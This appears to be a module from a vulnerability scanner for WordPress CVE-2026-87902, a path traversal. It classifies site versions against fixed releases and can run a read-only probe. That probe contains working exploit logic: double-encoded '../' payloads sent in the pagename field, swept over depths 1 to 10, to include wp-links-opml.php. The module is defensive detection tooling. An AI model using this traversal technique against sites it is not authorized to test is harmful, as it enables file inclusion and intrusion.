from __future__ import annotations

import json
import secrets
import urllib.parse
from typing import Any

from ...core.http import normalize_url, request
from ...core.models import Finding
from ...core.versions import parse_version_safe

CVE_ID = "CVE-2026-87902"
NAME = "WordPress core unauthenticated page-template path traversal"
COMPONENT = "WordPress core"
AFFECTED_RULE = "WordPress 4.7.0 through the branch-specific releases fixed on 2026-09-22"
HAS_EXPLOIT = True
INTRUSIVE = False
EXPLOIT_MODES = ["safe"]

# Official GHSA branch ranges. Each value is the first fixed release.
FIRST_FIXED_BY_BRANCH = {
    "7.1": "7.1.2",
    "7.0": "7.0.6",
    "6.9": "6.9.9",
    "6.8": "6.8.10",
    "6.7": "6.7.9",
    "6.6": "6.6.9",
    "6.5": "6.5.12",
    "6.4": "6.4.12",
    "6.3": "6.3.12",
    "6.2": "6.2.13",
    "6.1": "6.1.14",
    "6.0": "6.0.16",
    "5.9": "5.9.18",
    "5.8": "5.8.17",
    "5.7": "5.7.19",
    "5.6": "5.6.21",
    "5.5": "5.5.22",
    "5.4": "5.4.23",
    "5.3": "5.3.25",
    "5.2": "5.2.28",
    "5.1": "5.1.26",
    "5.0": "5.0.29",
    "4.9": "4.9.33",
    "4.8": "4.8.32",
    "4.7": "4.7.37",
}


def classify_version(wordpress_version: str | None) -> str:
    version = parse_version_safe(wordpress_version)
    if version is None:
        return "INCONCLUSIVE"
    branch = f"{version.major}.{version.minor}"
    fixed = parse_version_safe(FIRST_FIXED_BY_BRANCH.get(branch))
    if fixed is None:
        return "NOT_AFFECTED"
    return "LIKELY_VULNERABLE" if version < fixed else "PATCHED"


def passive_result(wordpress_version: str | None) -> Finding:
    status = classify_version(wordpress_version)
    if status == "INCONCLUSIVE":
        detail = "WordPress was detected, but its core version could not be determined."
        action = "Determine the WordPress core branch and install its 2026-09-22 security release or newer."
        confidence = "MEDIUM"
    elif status == "LIKELY_VULNERABLE":
        detail = f"WordPress {wordpress_version} is within the affected range published by WordPress."
        action = "Upgrade to the fixed release for this WordPress branch or a newer supported branch."
        confidence = "HIGH"
    elif status == "PATCHED":
        detail = f"WordPress {wordpress_version} includes the branch-specific fix for CVE-2026-87902."
        action = "No action is required for this CVE if version detection is accurate."
        confidence = "HIGH"
    else:
        detail = f"WordPress {wordpress_version} is outside the advisory's affected branches."
        action = "No action is required for this CVE if version detection is accurate."
        confidence = "HIGH"
    return Finding(
        cve=CVE_ID,
        name=NAME,
        status=status,
        confidence=confidence,
        component=COMPONENT,
        component_version=wordpress_version,
        affected_rule=AFFECTED_RULE,
        exploit_available=HAS_EXPLOIT,
        detail=detail,
        action=action,
    )


def _discover_page_ids(target_url: str, timeout: int, proxy: str | None) -> list[int]:
    endpoint = f"{normalize_url(target_url)}/?rest_route=/wp/v2/pages&per_page=20&_fields=id"
    response = request(endpoint, timeout=timeout, proxy=proxy)
    if response.get("status") != 200:
        return [2]
    try:
        payload = json.loads(response.get("body", ""))
    except (json.JSONDecodeError, TypeError):
        return [2]
    ids = [item.get("id") for item in payload if isinstance(item, dict)] if isinstance(payload, list) else []
    valid_ids = [value for value in ids if isinstance(value, int) and value > 0]
    return valid_ids[:5] or [2]


def _encoded_candidate(target: str, depth: int) -> str:
    path = "templates/" + "../" * depth + target.lstrip("/")
    # urllib always leaves periods unescaped, but traversal periods must survive
    # WordPress's early title sanitization as encoded octets.
    encoded_once = urllib.parse.quote(path, safe="").replace(".", "%2E")
    return urllib.parse.quote(encoded_once, safe="")


def _post_candidate(
    target_url: str,
    page_id: int,
    candidate: str,
    depth: int,
    timeout: int,
    proxy: str | None,
) -> dict[str, Any]:
    body = f"page_id={page_id}&pagename={_encoded_candidate(candidate, depth)}"
    return request(
        f"{normalize_url(target_url)}/",
        method="POST",
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        data=body,
        timeout=timeout,
        proxy=proxy,
    )


def _is_opml_proof(body: str) -> bool:
    lowered = body.lower()
    return "<opml" in lowered and "<head>" in lowered and "</opml>" in lowered


def run_safe_probe(target_url: str, timeout: int = 12, proxy: str | None = None) -> Finding:
    page_ids = _discover_page_ids(target_url, timeout, proxy)
    missing = f"proofcms-missing-{secrets.token_hex(6)}"
    observations: list[str] = []
    for page_id in page_ids:
        for depth in range(1, 11):
            control = _post_candidate(target_url, page_id, missing, depth, timeout, proxy)
            proof = _post_candidate(target_url, page_id, "wp-links-opml", depth, timeout, proxy)
            control_hit = _is_opml_proof(control.get("body", ""))
            proof_hit = _is_opml_proof(proof.get("body", ""))
            observations.append(
                f"page_id={page_id},depth={depth},control={control.get('status')},proof={proof.get('status')}"
            )
            if proof.get("status") == 200 and proof_hit and not control_hit:
                return Finding(
                    cve=CVE_ID,
                    name=NAME,
                    status="VULNERABLE",
                    confidence="CONFIRMED",
                    component=COMPONENT,
                    affected_rule=AFFECTED_RULE,
                    exploit_available=HAS_EXPLOIT,
                    exploit_ran=True,
                    proof_url=f"{normalize_url(target_url)}/",
                    detail=(
                        "A differential, read-only traversal included the stock wp-links-opml.php file "
                        f"with page_id={page_id} and depth={depth}; the randomized control did not match."
                    ),
                    action="Upgrade WordPress to the fixed release for the installed branch immediately.",
                )
    return Finding(
        cve=CVE_ID,
        name=NAME,
        status="NOT_CONFIRMED",
        confidence="MEDIUM",
        component=COMPONENT,
        affected_rule=AFFECTED_RULE,
        exploit_available=HAS_EXPLOIT,
        exploit_ran=True,
        detail=(
            "The safe differential LFI probe did not confirm traversal. Theme layout and page-template "
            f"preconditions may be absent. Attempts: {'; '.join(observations)}"
        ),
        action="Apply the branch-specific WordPress security update when the detected version is affected.",
    )


def check(
    target_url: str,
    cms_version: str | None = None,
    run_exploit_check: bool = False,
    timeout: int = 12,
    proxy: str | None = None,
    exploit_mode: str = "safe",
    aggressive_command: str | None = None,
    plugins: dict[str, Any] | None = None,
    **kwargs: Any,
) -> Finding:
    wordpress_version = cms_version
    passive = passive_result(wordpress_version)
    if not run_exploit_check:
        return passive
    if exploit_mode != "safe":
        passive.detail += " This module supports only the read-only safe LFI proof."
        return passive
    if passive.status not in {"LIKELY_VULNERABLE", "INCONCLUSIVE"}:
        passive.detail += " Safe proof skipped because the detected version is outside the affected range."
        return passive
    result = run_safe_probe(target_url, timeout=timeout, proxy=proxy)
    result.component_version = wordpress_version
    return result


def metadata() -> dict[str, Any]:
    return {
        "cve": CVE_ID,
        "cms": "wordpress",
        "name": NAME,
        "component": COMPONENT,
        "affected_rule": AFFECTED_RULE,
        "affected_versions": list(FIRST_FIXED_BY_BRANCH),
        "exploit_available": HAS_EXPLOIT,
        "exploit_modes": EXPLOIT_MODES,
        "intrusive": INTRUSIVE,
        "module_version": "1.0.0",
        "last_reviewed": "2026-09-28",
        "updated": "2026-09-28",
        "required_detectors": [],
        "references": [
            "https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-7hp8-65ch-5whp",
            "https://nvd.nist.gov/vuln/detail/CVE-2026-87902",
            "https://hadrian.io/vulnerability-alerts/cve-2026-87902-working-poc-wordpress-critical-path-traversal",
        ],
    }
